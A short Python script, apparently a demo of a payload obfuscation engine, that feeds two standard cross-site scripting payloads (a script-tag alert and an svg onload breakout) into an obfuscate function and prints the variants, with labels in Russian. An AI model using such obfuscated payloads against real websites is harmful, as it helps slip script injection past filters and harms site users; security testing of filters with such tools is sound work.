from engine.obfuscator import obfuscate
originals = ["<script>alert(1)</script>", "'\"><svg/onload=alert(1)>"]
for p in originals:
    variants = obfuscate(p)
    print(f"\nОригинал: {p}\nВарианты обфускации ({len(variants)}):")
    for v in variants:
         print("  ", v)